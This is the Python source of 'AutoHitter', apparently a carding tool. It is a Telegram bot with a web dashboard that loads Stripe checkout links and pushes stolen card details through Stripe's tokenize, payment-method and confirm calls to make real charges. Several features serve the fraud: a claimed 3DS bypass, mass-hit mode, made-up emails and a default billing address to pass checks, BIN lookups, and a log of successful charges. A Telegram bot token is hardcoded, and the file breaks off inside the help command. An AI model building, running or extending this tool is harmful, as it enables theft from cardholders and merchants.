"""
AutoHitter — All-in-one Telegram bot + Admin Dashboard
Dev: Zangi

Run:
    python autohitter.py

Telegram bot starts polling; admin dashboard starts on PORT (default 3000).
Open http://localhost:3000/admin to view the dashboard.
"""

import asyncio
import re
import base64
import time
import random
import os
import json
import threading
import requests
import aiohttp
from datetime import datetime
from urllib.parse import unquote
from http.server import HTTPServer, BaseHTTPRequestHandler
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ─────────────────────────────────────────────────────────────────────────────
# CONFIGURATION
# ─────────────────────────────────────────────────────────────────────────────

BOT_TOKEN = "7415995546:AAHxcXy-WLviEaPPgAqKfq0w7M0Xq8Jyg1U"
HITS_FILE = "/tmp/autohitter_hits.json"   # change path if needed on Windows
ADMIN_PORT = int(os.environ.get("PORT", "3000"))

TIMEOUT = aiohttp.ClientTimeout(total=30, connect=10)

AUTOHITTER_HEADERS = {
    "accept": "application/json",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://checkout.stripe.com",
    "referer": "https://checkout.stripe.com/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site"
}

user_sessions = {}

# ─────────────────────────────────────────────────────────────────────────────
# HITS DATABASE (JSON file)
# ─────────────────────────────────────────────────────────────────────────────

def record_hit(tg_user, card_display, checkout_data, bin_info, result, command):
    price = checkout_data.get("price", 0) or 0
    currency = checkout_data.get("currency", "USD")
    b = bin_info or {}
    entry = {
        "ts": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"),
        "ts_epoch": time.time(),
        "card": card_display,
        "amount": f"{price:.2f} {currency}",
        "merchant": checkout_data.get("merchant", "Unknown"),
        "merchant_url": checkout_data.get("merchant_url", ""),
        "confirm_url": result.get("confirm_url") or checkout_data.get("confirm_url") or "",
        "bin_brand": b.get("brand", "N/A"),
        "bin_type": b.get("type", "N/A"),
        "bin_level": b.get("level", "N/A"),
        "bin_bank": b.get("bank", "N/A"),
        "bin_country": b.get("country", "N/A"),
        "bin_flag": b.get("flag", ""),
        "tg_id": str(tg_user.id),
        "tg_name": (tg_user.full_name or "").strip(),
        "tg_username": tg_user.username or "",
        "command": command,
    }
    try:
        hits = []
        if os.path.exists(HITS_FILE):
            with open(HITS_FILE, "r") as f:
                hits = json.load(f)
        hits.append(entry)
        with open(HITS_FILE, "w") as f:
            json.dump(hits, f)
    except Exception:
        pass

# ─────────────────────────────────────────────────────────────────────────────
# ADMIN DASHBOARD (HTTP server)
# ─────────────────────────────────────────────────────────────────────────────

ADMIN_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AutoHitter Admin Dashboard</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { background: #0d0d0d; color: #e0e0e0; font-family: 'Segoe UI', sans-serif; }
  header {
    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
    padding: 22px 32px; border-bottom: 2px solid #00d4ff33;
    display: flex; align-items: center; justify-content: space-between;
  }
  header h1 { font-size: 1.6rem; color: #00d4ff; letter-spacing: 2px; }
  header p  { color: #6b7280; font-size: 0.82rem; margin-top: 3px; }
  .stats { display: flex; gap: 14px; padding: 18px 32px; flex-wrap: wrap; }
  .stat-card {
    background: #111827; border: 1px solid #1f2937; border-radius: 10px;
    padding: 14px 22px; flex: 1; min-width: 130px; text-align: center;
  }
  .stat-card .num { font-size: 1.9rem; font-weight: bold; color: #00d4ff; }
  .stat-card .lbl { font-size: 0.73rem; color: #6b7280; margin-top: 4px;
                    text-transform: uppercase; letter-spacing: 1px; }
  .toolbar {
    padding: 0 32px 14px; display: flex; gap: 10px; align-items: center; flex-wrap: wrap;
  }
  .toolbar input {
    background: #111827; border: 1px solid #374151; border-radius: 6px;
    color: #e0e0e0; padding: 8px 14px; font-size: 0.84rem; width: 280px;
  }
  .toolbar input::placeholder { color: #4b5563; }
  .toolbar button {
    background: #0f3460; border: 1px solid #00d4ff44; border-radius: 6px;
    color: #00d4ff; padding: 8px 18px; cursor: pointer; font-size: 0.84rem;
  }
  .toolbar button:hover { background: #1a4a7a; }
  .meta { margin-left: auto; color: #374151; font-size: 0.75rem; display: flex; align-items: center; gap: 8px; }
  #live-dot { width: 8px; height: 8px; border-radius: 50%; background: #4ade80;
              display: inline-block; animation: pulse 2s infinite; }
  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.3} }
  #count-badge {
    background: #0f3460; color: #00d4ff; border-radius: 20px;
    padding: 2px 10px; font-size: 0.78rem;
  }
  .table-wrap { padding: 0 32px 40px; overflow-x: auto; }
  table { width: 100%; border-collapse: collapse; font-size: 0.81rem; min-width: 900px; }
  thead tr { background: #111827; }
  thead th {
    padding: 11px 13px; text-align: left; color: #6b7280; font-weight: 600;
    text-transform: uppercase; letter-spacing: 0.7px; border-bottom: 1px solid #1f2937;
    white-space: nowrap;
  }
  tbody tr { border-bottom: 1px solid #161616; transition: background 0.12s; }
  tbody tr:hover { background: #111827; }
  td { padding: 10px 13px; vertical-align: top; }
  .badge {
    display: inline-block; background: #052e16; color: #4ade80;
    border: 1px solid #166534; border-radius: 4px; padding: 1px 7px;
    font-size: 0.73rem; font-weight: 700;
  }
  .cmd-badge {
    display: inline-block; background: #1e1b4b; color: #a5b4fc;
    border: 1px solid #3730a3; border-radius: 4px; padding: 1px 7px; font-size: 0.73rem;
  }
  .card-mono { font-family: monospace; color: #f0abfc; letter-spacing: 0.5px; }
  .amount-col { color: #4ade80; font-weight: 700; }
  .ts-col { color: #6b7280; font-size: 0.73rem; white-space: nowrap; }
  .user-name { color: #e0e0e0; font-size: 0.82rem; }
  .user-sub { color: #6b7280; font-size: 0.73rem; margin-top: 2px; }
  .bin-main { color: #93c5fd; font-size: 0.78rem; }
  .bin-sub { color: #4b5563; font-size: 0.72rem; margin-top: 2px; }
  a.clink { color: #00d4ff; text-decoration: none; font-size: 0.74rem; word-break: break-all; }
  a.clink:hover { text-decoration: underline; }
  .empty-state { text-align: center; padding: 60px 20px; color: #374151; }
  .empty-icon { font-size: 3rem; margin-bottom: 12px; }
  .row-num { color: #2d3748; font-size: 0.78rem; }
</style>
</head>
<body>
<header>
  <div>
    <h1>&#9889; AutoHitter Admin</h1>
    <p>Successful checkout dashboard &mdash; Stripe Co (Beta) &mdash; Dev: Zangi</p>
  </div>
</header>

<div class="stats">
  <div class="stat-card"><div class="num" id="stat-total">&#8212;</div><div class="lbl">Total Hits</div></div>
  <div class="stat-card"><div class="num" id="stat-today">&#8212;</div><div class="lbl">Today</div></div>
  <div class="stat-card"><div class="num" id="stat-users">&#8212;</div><div class="lbl">Unique Users</div></div>
  <div class="stat-card"><div class="num" id="stat-amount">&#8212;</div><div class="lbl">Total Charged</div></div>
</div>

<div class="toolbar">
  <input type="text" id="search" placeholder="Search card, user, merchant, BIN, country..." oninput="filterTable()">
  <button onclick="loadData()">&#8635; Refresh</button>
  <div class="meta">
    <span id="live-dot"></span> Live &nbsp;|&nbsp; Auto-refreshes every 15s &nbsp;
    <span id="count-badge">0 hits</span>
  </div>
</div>

<div class="table-wrap">
  <table>
    <thead>
      <tr>
        <th>#</th>
        <th>Timestamp</th>
        <th>Card</th>
        <th>Amount</th>
        <th>Merchant</th>
        <th>BIN Info</th>
        <th>Telegram User</th>
        <th>Cmd</th>
        <th>Confirm URL</th>
      </tr>
    </thead>
    <tbody id="hits-body">
      <tr><td colspan="9"><div class="empty-state"><div class="empty-icon">&#128683;</div>Loading...</div></td></tr>
    </tbody>
  </table>
</div>

<script>
let allData = [];

async function loadData() {
  try {
    const r = await fetch('/admin/data');
    allData = await r.json();
    renderTable(allData);
    updateStats(allData);
    document.getElementById('count-badge').textContent = allData.length + ' hit' + (allData.length !== 1 ? 's' : '');
  } catch(e) {
    console.error('Fetch error:', e);
  }
}

function updateStats(data) {
  document.getElementById('stat-total').textContent = data.length;
  const todayStr = new Date().toISOString().slice(0, 10);
  document.getElementById('stat-today').textContent = data.filter(d => d.ts.startsWith(todayStr)).length;
  document.getElementById('stat-users').textContent = new Set(data.map(d => d.tg_id)).size;
  let total = 0;
  data.forEach(d => {
    const m = d.amount.match(/([\\d\\.]+)/);
    if (m) total += parseFloat(m[1]);
  });
  document.getElementById('stat-amount').textContent = '$' + total.toFixed(2);
}

function filterTable() {
  const q = document.getElementById('search').value.toLowerCase().trim();
  if (!q) { renderTable(allData); return; }
  renderTable(allData.filter(d =>
    d.card.toLowerCase().includes(q) ||
    d.tg_name.toLowerCase().includes(q) ||
    d.tg_username.toLowerCase().includes(q) ||
    d.tg_id.includes(q) ||
    d.merchant.toLowerCase().includes(q) ||
    d.bin_brand.toLowerCase().includes(q) ||
    d.bin_bank.toLowerCase().includes(q) ||
    d.bin_country.toLowerCase().includes(q) ||
    d.amount.toLowerCase().includes(q)
  ));
}

function esc(s) {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

function renderTable(data) {
  const tbody = document.getElementById('hits-body');
  if (!data.length) {
    tbody.innerHTML = '<tr><td colspan="9"><div class="empty-state"><div class="empty-icon">&#128683;</div>No successful hits yet. Charged cards will appear here automatically.</div></td></tr>';
    return;
  }
  const rows = [...data].reverse().map((d, i) => {
    const num = data.length - i;
    const userHandle = d.tg_username ? '@' + esc(d.tg_username) : '';
    const confirmCell = d.confirm_url
      ? '<a class="clink" href="' + esc(d.confirm_url) + '" target="_blank" rel="noopener">'
        + esc(d.confirm_url.length > 42 ? d.confirm_url.slice(0, 42) + '...' : d.confirm_url)
        + '</a>'
      : '<span style="color:#2d3748">N/A</span>';
    const merchantCell = d.merchant_url
      ? '<a class="clink" href="' + esc(d.merchant_url) + '" target="_blank" rel="noopener">' + esc(d.merchant) + '</a>'
      : esc(d.merchant);
    const binParts = [d.bin_brand, d.bin_type, d.bin_level].filter(x => x && x !== 'N/A');
    const binMain = binParts.join(' ') || 'N/A';
    const binSub = [d.bin_bank, d.bin_country + (d.bin_flag ? ' ' + d.bin_flag : '')].filter(x => x && x !== 'N/A').join(' &bull; ');
    return '<tr>'
      + '<td class="row-num">' + num + '</td>'
      + '<td class="ts-col">' + esc(d.ts) + '</td>'
      + '<td class="card-mono">' + esc(d.card) + '</td>'
      + '<td class="amount-col">' + esc(d.amount) + ' <span class="badge">PAID</span></td>'
      + '<td>' + merchantCell + '</td>'
      + '<td><div class="bin-main">' + esc(binMain) + '</div><div class="bin-sub">' + binSub + '</div></td>'
      + '<td><div class="user-name">' + esc(d.tg_name || d.tg_id) + '</div>'
        + '<div class="user-sub">' + (userHandle ? esc(userHandle) + ' &bull; ' : '') + 'ID: ' + esc(d.tg_id) + '</div></td>'
      + '<td><span class="cmd-badge">' + esc(d.command) + '</span></td>'
      + '<td>' + confirmCell + '</td>'
      + '</tr>';
  }).join('');
  tbody.innerHTML = rows;
}

loadData();
setInterval(loadData, 15000);
</script>
</body>
</html>"""


class ReuseServer(HTTPServer):
    allow_reuse_address = True


class AdminHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass  # suppress logs

    def do_GET(self):
        p = self.path.split("?")[0]

        if p in ("/admin", "/admin/", "/", ""):
            body = ADMIN_HTML.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        elif p in ("/admin/data", "/data"):
            try:
                if os.path.exists(HITS_FILE):
                    with open(HITS_FILE, "r") as f:
                        data = f.read().encode()
                else:
                    data = b"[]"
            except Exception:
                data = b"[]"
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(data)))
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(data)

        elif p in ("/healthz",):
            body = b'{"status":"ok"}'
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        else:
            self.send_response(302)
            self.send_header("Location", "/admin")
            self.end_headers()


def start_admin_server():
    server = ReuseServer(("0.0.0.0", ADMIN_PORT), AdminHandler)
    print(f"AutoHitter Admin dashboard running at http://localhost:{ADMIN_PORT}/admin")
    server.serve_forever()

# ─────────────────────────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────────────────────────

RANDOM_NAMES = [
    "james.wilson", "sarah.johnson", "michael.davis", "emily.clark",
    "david.martinez", "jessica.taylor", "daniel.anderson", "ashley.thomas",
    "chris.jackson", "amanda.white", "ryan.harris", "stephanie.lewis",
    "kevin.robinson", "nicole.walker", "brandon.hall", "rachel.young",
    "tyler.allen", "megan.hernandez", "justin.king", "lauren.wright"
]
RANDOM_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com"]

def random_email():
    name = random.choice(RANDOM_NAMES)
    suffix = random.randint(10, 999)
    domain = random.choice(RANDOM_DOMAINS)
    return f"{name}{suffix}@{domain}"

def esc(text):
    return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

def extract_checkout_url(text):
    patterns = [
        r'https?://checkout\.stripe\.com/c/pay/cs_[^\s\"\'\<\>\)]+',
        r'https?://checkout\.stripe\.com/[^\s\"\'\<\>\)]+',
        r'https?://buy\.stripe\.com/[^\s\"\'\<\>\)]+',
    ]
    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            return m.group(0).rstrip('.,;:')
    return None

def decode_pk_from_url(url):
    result = {"pk": None, "cs": None}
    try:
        cs_match = re.search(r'cs_(live|test)_[A-Za-z0-9]+', url)
        if cs_match:
            result["cs"] = cs_match.group(0)
        if '#' in url:
            hash_part = url.split('#')[1]
            hash_decoded = unquote(hash_part)
            try:
                decoded_bytes = base64.b64decode(hash_decoded)
                xored = ''.join(chr(b ^ 5) for b in decoded_bytes)
                pk_match = re.search(r'pk_(live|test)_[A-Za-z0-9]+', xored)
                if pk_match:
                    result["pk"] = pk_match.group(0)
            except Exception:
                pass
    except Exception:
        pass
    return result

def parse_card(text):
    text = text.strip()
    parts = re.split(r'[|:/\\\-\s]+', text)
    if len(parts) < 4:
        return None
    cc = re.sub(r'\D', '', parts[0])
    if not (15 <= len(cc) <= 19):
        return None
    month = parts[1].strip()
    if len(month) == 1:
        month = f"0{month}"
    if not (len(month) == 2 and month.isdigit() and 1 <= int(month) <= 12):
        return None
    year = parts[2].strip()
    if len(year) == 4:
        year = year[2:]
    if len(year) != 2:
        return None
    cvv = re.sub(r'\D', '', parts[3])
    if not (3 <= len(cvv) <= 4):
        return None
    return {"cc": cc, "month": month, "year": year, "cvv": cvv}

def get_bin_info(cc):
    bin_number = cc[:6]
    try:
        resp = requests.get(
            f"https://lookup.binlist.net/{bin_number}",
            headers={"Accept-Version": "3"},
            timeout=8
        )
        if resp.status_code == 200:
            d = resp.json()
            brand = d.get("scheme", "N/A").upper()
            btype = d.get("type", "N/A").upper()
            level = d.get("brand", "N/A").upper()
            bank = d.get("bank", {}).get("name", "N/A") if isinstance(d.get("bank"), dict) else "N/A"
            country_obj = d.get("country", {}) or {}
            country = country_obj.get("name", "N/A")
            flag = country_obj.get("emoji", "")
            return {"bin": bin_number, "brand": brand, "type": btype, "level": level,
                    "bank": bank, "country": country, "flag": flag}
    except Exception:
        pass
    try:
        resp = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=8)
        if resp.status_code == 200:
            d = resp.json()
            return {"bin": bin_number, "brand": d.get("brand", "N/A"), "type": d.get("type", "N/A"),
                    "level": d.get("level", "N/A"), "bank": d.get("bank", "N/A"),
                    "country": d.get("country_name", "N/A"), "flag": d.get("country_flag", "")}
    except Exception:
        pass
    return {"bin": bin_number, "brand": "N/A", "type": "N/A", "level": "N/A",
            "bank": "N/A", "country": "N/A", "flag": ""}

# ─────────────────────────────────────────────────────────────────────────────
# STRIPE LOGIC
# ─────────────────────────────────────────────────────────────────────────────

async def get_checkout_info(url):
    result = {
        "pk": None, "cs": None, "merchant": None, "merchant_url": None,
        "price": None, "currency": None, "init_data": None,
        "error": None, "email": None, "confirm_url": None
    }
    try:
        decoded = decode_pk_from_url(url)
        result["pk"] = decoded.get("pk")
        result["cs"] = decoded.get("cs")
        if result["pk"] and result["cs"]:
            async with aiohttp.ClientSession(timeout=TIMEOUT) as session:
                body = f"key={result['pk']}&eid=NA&browser_locale=en-US&redirect_type=url"
                async with session.post(
                    f"https://api.stripe.com/v1/payment_pages/{result['cs']}/init",
                    headers=AUTOHITTER_HEADERS, data=body
                ) as r:
                    init_data = await r.json()
                if "error" not in init_data:
                    result["init_data"] = init_data
                    acc = init_data.get("account_settings", {}) or {}
                    result["merchant"] = acc.get("display_name") or acc.get("business_name") or "Unknown"
                    result["merchant_url"] = acc.get("support_url") or acc.get("url") or None
                    result["email"] = (
                        init_data.get("customer_email")
                        or (init_data.get("customer") or {}).get("email")
                    )
                    lig = init_data.get("line_item_group")
                    inv = init_data.get("invoice")
                    if lig:
                        result["price"] = lig.get("total", 0) / 100
                        result["currency"] = lig.get("currency", "usd").upper()
                    elif inv:
                        result["price"] = inv.get("total", 0) / 100
                        result["currency"] = inv.get("currency", "usd").upper()
                    else:
                        pi = init_data.get("payment_intent") or {}
                        result["price"] = pi.get("amount", 0) / 100
                        result["currency"] = pi.get("currency", "usd").upper()
                    result["confirm_url"] = (
                        init_data.get("success_url") or init_data.get("return_url")
                        or init_data.get("redirect_url") or None
                    )
                else:
                    result["error"] = init_data.get("error", {}).get("message", "Init failed")
        else:
            result["error"] = "Could not decode PK/CS from URL"
    except Exception as e:
        result["error"] = str(e)
    return result


async def charge_card(card, checkout_data):
    start = time.perf_counter()
    card_str = f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}"
    result = {"card": card_str, "status": None, "response": None, "time": 0, "confirm_url": None}
    pk = checkout_data.get("pk")
    cs = checkout_data.get("cs")
    init_data = checkout_data.get("init_data")
    if not pk or not cs or not init_data:
        result["status"] = "FAILED"
        result["response"] = "No checkout data"
        result["time"] = round(time.perf_counter() - start, 2)
        return result
    try:
        async with aiohttp.ClientSession(timeout=TIMEOUT) as s:
            email = checkout_data.get("email") or checkout_data.get("used_email") or random_email()
            checksum = init_data.get("init_checksum", "")
            lig = init_data.get("line_item_group")
            inv = init_data.get("invoice")
            if lig:
                total = lig.get("total", 0)
                subtotal = lig.get("subtotal", 0)
            elif inv:
                total = inv.get("total", 0)
                subtotal = inv.get("subtotal", 0)
            else:
                pi_data = init_data.get("payment_intent") or {}
                total = pi_data.get("amount", 0)
                subtotal = total

            cust = init_data.get("customer") or {}
            addr = cust.get("address") or {}
            name = cust.get("name") or "John Smith"
            country = addr.get("country") or "US"
            line1 = addr.get("line1") or "476 West White Mountain Blvd"
            city = addr.get("city") or "Pinetop"
            state = addr.get("state") or "AZ"
            zip_code = addr.get("postal_code") or "85929"

            # Step 1: Tokenize
            token_body = (
                f"card[number]={card['cc']}&card[cvc]={card['cvv']}"
                f"&card[exp_month]={card['month']}&card[exp_year]={card['year']}"
                f"&card[name]={name}&card[address_country]={country}"
                f"&card[address_line1]={line1}&card[address_city]={city}"
                f"&card[address_state]={state}&card[address_zip]={zip_code}"
                f"&key={pk}&pasted_fields=number"
                f"&payment_user_agent=stripe.js%2Fb3f6c00c8a%3B+stripe-js-v3%2Fb3f6c00c8a%3B+checkout"
                f"&referrer=https%3A%2F%2Fcheckout.stripe.com&time_on_page=32567"
            )
            token_headers = {
                "accept": "application/json",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://js.stripe.com",
                "referer": "https://js.stripe.com/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            async with s.post("https://api.stripe.com/v1/tokens", headers=token_headers, data=token_body) as r:
                tok = await r.json()
            if "error" in tok:
                result["status"] = "DECLINED"
                result["response"] = tok["error"].get("message", "Card error")
                result["time"] = round(time.perf_counter() - start, 2)
                return result
            token_id = tok.get("id")
            if not token_id:
                result["status"] = "FAILED"
                result["response"] = "No Token ID"
                result["time"] = round(time.perf_counter() - start, 2)
                return result

            # Step 2: Payment method
            pm_body = (
                f"type=card&card[token]={token_id}"
                f"&billing_details[name]={name}&billing_details[email]={email}"
                f"&billing_details[address][country]={country}"
                f"&billing_details[address][line1]={line1}"
                f"&billing_details[address][city]={city}"
                f"&billing_details[address][postal_code]={zip_code}"
                f"&billing_details[address][state]={state}&key={pk}"
            )
            async with s.post("https://api.stripe.com/v1/payment_methods", headers=AUTOHITTER_HEADERS, data=pm_body) as r:
                pm = await r.json()
            if "error" in pm:
                result["status"] = "DECLINED"
                result["response"] = pm["error"].get("message", "Card error")
                result["time"] = round(time.perf_counter() - start, 2)
                return result
            pm_id = pm.get("id")
            if not pm_id:
                result["status"] = "FAILED"
                result["response"] = "No Payment Method"
                result["time"] = round(time.perf_counter() - start, 2)
                return result

            # Step 3: Confirm
            conf_body = (
                f"eid=NA&payment_method={pm_id}&expected_amount={total}"
                f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
                f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
                f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
                f"&last_displayed_line_item_group_details[total_discount_amount]=0"
                f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
                f"&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
            )
            async with s.post(
                f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
                headers=AUTOHITTER_HEADERS, data=conf_body
            ) as r:
                conf = await r.json()

            conf_url = (
                conf.get("success_url") or conf.get("return_url")
                or checkout_data.get("confirm_url") or None
            )
            result["confirm_url"] = conf_url

            if "error" in conf:
                err = conf["error"]
                dc = err.get("decline_code", "")
                msg = err.get("message", "Failed")
                result["status"] = "DECLINED"
                result["response"] = f"{dc.upper()}: {msg}" if dc else msg
            else:
                pi = conf.get("payment_intent") or {}
                st = pi.get("status", "") or conf.get("status", "")
                pi_id = pi.get("id", "")
                pi_cs_val = pi.get("client_secret", "")

                if st == "succeeded":
                    result["status"] = "CHARGED"
                    result["response"] = "Payment Successful"
                elif st == "requires_action" and pi_id and pi_cs_val:
                    bypass_body = (
                        f"payment_method={pm_id}&expected_payment_method_type=card"
                        f"&use_stripe_sdk=true&key={pk}&client_secret={pi_cs_val}"
                    )
                    async with s.post(
                        f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
                        headers=AUTOHITTER_HEADERS, data=bypass_body
                    ) as r2:
                        bypass_resp = await r2.json()
                    if "error" not in bypass_resp:
                        bypass_st = bypass_resp.get("status", "")
                        if bypass_st == "succeeded":
                            result["status"] = "CHARGED"
                            result["response"] = "3DS Bypassed - Payment Successful"
                        elif bypass_st == "requires_action":
                            na = bypass_resp.get("next_action") or {}
                            redirect = na.get("redirect_to_url") or {}
                            rurl = redirect.get("url", "")
                            if rurl:
                                try:
                                    async with s.get(rurl, headers=AUTOHITTER_HEADERS, allow_redirects=True):
                                        pass
                                    async with s.post(
                                        f"https://api.stripe.com/v1/payment_intents/{pi_id}",
                                        headers=AUTOHITTER_HEADERS,
                                        data=f"key={pk}&client_secret={pi_cs_val}"
                                    ) as r4:
                                        final = await r4.json()
                                        if final.get("status") == "succeeded":
                                            result["status"] = "CHARGED"
                                            result["response"] = "3DS Bypassed - Payment Successful"
                                        else:
                                            result["status"] = "3DS"
                                            result["response"] = "3DS Required"
                                except Exception:
                                    result["status"] = "3DS"
                                    result["response"] = "3DS Required"
                            else:
                                result["status"] = "3DS"
                                result["response"] = "3DS Required"
                        else:
                            result["status"] = "3DS"
                            result["response"] = f"3DS: {bypass_st}"
                    else:
                        result["status"] = "3DS"
                        result["response"] = "3DS Required"
                elif st == "requires_action":
                    result["status"] = "3DS"
                    result["response"] = "3DS Required"
                elif st == "requires_payment_method":
                    result["status"] = "DECLINED"
                    result["response"] = "Card Declined"
                elif st == "" or conf.get("status") == "complete":
                    result["status"] = "CHARGED"
                    result["response"] = "Payment Successful ($0 Auth)"
                else:
                    result["status"] = "UNKNOWN"
                    result["response"] = st or "Unknown"

    except asyncio.TimeoutError:
        result["status"] = "ERROR"
        result["response"] = "Request timed out"
    except Exception as e:
        result["status"] = "ERROR"
        result["response"] = str(e)[:80]

    result["time"] = round(time.perf_counter() - start, 2)
    return result

# ─────────────────────────────────────────────────────────────────────────────
# FORMATTERS
# ─────────────────────────────────────────────────────────────────────────────

def fmt_charged(card_str, checkout_data, bin_info, result):
    merchant = checkout_data.get("merchant", "Unknown")
    merchant_url = checkout_data.get("merchant_url") or ""
    price = checkout_data.get("price", 0) or 0
    currency = checkout_data.get("currency", "USD")
    confirm_url = result.get("confirm_url") or checkout_data.get("confirm_url") or "N/A"
    amount_str = f"{price:.2f} {currency}"
    site_line = f"{esc(merchant)} ({esc(merchant_url)})" if merchant_url else esc(merchant)
    b_brand = bin_info.get('brand', 'N/A') if bin_info else 'N/A'
    b_type = bin_info.get('type', 'N/A') if bin_info else 'N/A'
    b_level = bin_info.get('level', 'N/A') if bin_info else 'N/A'
    b_bank = bin_info.get('bank', 'N/A') if bin_info else 'N/A'
    b_country = bin_info.get('country', 'N/A') if bin_info else 'N/A'
    b_flag = bin_info.get('flag', '') if bin_info else ''
    bin_line = f"{esc(b_brand)} {esc(b_type)} {esc(b_level)} - {esc(b_bank)} - {esc(b_country)} {b_flag}"
    return (
        f"<b>CC:</b> <code>{esc(card_str)}</code>\n"
        f"<b>Status:</b> Paid ✅\n"
        f"<b>Message:</b> {esc(amount_str)} Charged!\n\n"
        f"<b>Site:</b> {site_line}\n"
        f"<b>ConfirmUrl:</b> {esc(confirm_url)}\n"
        f"<b>Amount:</b> {esc(amount_str)}\n\n"
        f"<b>BIN Info:</b> {bin_line}\n\n"
        f"<i>(Note: Some sites require payment confirmation via the confirm URL.)</i>\n\n"
        f"━━━━━━━━━━━━━━━\n"
        f"<b>Gateway:</b> Stripe Co (Beta)\n"
        f"<b>Dev:</b> Zangi"
    )

def fmt_declined_line(card_str, status, response, bin_info, time_taken):
    b_brand = bin_info.get('brand', 'N/A') if bin_info else 'N/A'
    b_type = bin_info.get('type', 'N/A') if bin_info else 'N/A'
    b_country = bin_info.get('country', 'N/A') if bin_info else 'N/A'
    b_flag = bin_info.get('flag', '') if bin_info else ''
    icon = "🔐" if status == "3DS" else ("❌" if status == "DECLINED" else "⚠️")
    return (
        f"{icon} <code>{esc(card_str)}</code>\n"
        f"   ↳ {esc(response)} | {esc(b_brand)} {esc(b_type)} | {esc(b_country)} {b_flag} | {time_taken}s"
    )

def fmt_declined_chk(card_str, status, response, bin_info, time_taken):
    b_brand = bin_info.get('brand', 'N/A') if bin_info else 'N/A'
    b_type = bin_info.get('type', 'N/A') if bin_info else 'N/A'
    b_level = bin_info.get('level', 'N/A') if bin_info else 'N/A'
    b_bank = bin_info.get('bank', 'N/A') if bin_info else 'N/A'
    b_country = bin_info.get('country', 'N/A') if bin_info else 'N/A'
    b_flag = bin_info.get('flag', '') if bin_info else ''
    if status == "3DS":
        icon, label = "🔐", "3DS REQUIRED"
    elif status == "DECLINED":
        icon, label = "❌", "DECLINED"
    elif status == "ERROR":
        icon, label = "⚠️", "ERROR"
    else:
        icon, label = "⚠️", str(status)
    return (
        f"<b>CC:</b> <code>{esc(card_str)}</code>\n"
        f"<b>Status:</b> {icon} {label}\n"
        f"<b>Message:</b> {esc(response)}\n\n"
        f"<b>BIN:</b> {esc(b_brand)} {esc(b_type)} {esc(b_level)}\n"
        f"<b>Bank:</b> {esc(b_bank)}\n"
        f"<b>Country:</b> {esc(b_country)} {b_flag}\n"
        f"<b>Time:</b> {time_taken}s\n\n"
        f"━━━━━━━━━━━━━━━\n"
        f"<b>Gateway:</b> Stripe Co (Beta)"
    )

# ─────────────────────────────────────────────────────────────────────────────
# TELEGRAM BOT HANDLERS
# ─────────────────────────────────────────────────────────────────────────────

async def safe_send(update, text, **kwargs):
    try:
        return await update.message.reply_text(text, parse_mode="HTML", **kwargs)
    except Exception:
        plain = re.sub(r'<[^>]+>', '', text)
        return await update.message.reply_text(plain, **kwargs)

async def safe_edit(msg, text):
    try:
        await msg.edit_text(text, parse_mode="HTML")
    except Exception:
        try:
            plain = re.sub(r'<[^>]+>', '', text)
            await msg.edit_text(plain)
        except Exception:
            pass

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await safe_send(update,
        "━━━━━━━━━━━━━━━\n"
        "💠 <b>AUTOHITTER BOT</b> 💠\n"
        "━━━━━━━━━━━━━━━\n\n"
        "🔥 <b>Welcome to AutoHitter!</b>\n\n"
        "⚡ <b>Commands:</b>\n"
        "• /ah <code>&lt;checkout_url&gt;</code> — Load checkout\n"
        "• /chk <code>&lt;cc|mm|yy|cvv&gt;</code> — Hit single card\n"
        "• /mass — Start mass hit (after /ah)\n"
        "• /info — Show checkout info\n"
        "• /stop — Stop mass hit\n"
        "• /help — All commands\n\n"
        "━━━━━━━━━━━━━━━\n"
        "<b>Gateway:</b> Stripe Co (Beta)\n"
        "<b>Dev:</b> Zangi"
    )

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await safe_send(update,
        "━━━━━━━━━━━━━━━\n"
